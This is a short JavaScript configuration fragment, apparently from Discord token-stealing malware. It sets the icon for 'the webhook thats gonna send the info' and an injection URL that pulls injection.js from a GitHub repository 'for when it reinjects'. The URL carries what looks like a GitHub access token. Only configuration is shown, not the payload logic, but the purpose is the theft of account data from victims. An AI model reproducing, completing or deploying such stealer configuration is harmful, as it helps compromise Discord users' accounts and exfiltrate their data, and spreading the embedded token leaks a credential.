...
const config = {
  ...
  embed_icon: 'https://media.discordapp.net/attachments/996863879768440933/1000386886830919720/131231.png?width=985&height=657'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
  ...
  injection_url: 'https://raw.githubusercontent.com/krakenbeams/injections/main/injection.js?token=GHSAT0AAAAAABYEFMJQLNUSJV22D5YYYLXQYYLYFPQ', //injection url for when it reinjects
  /**
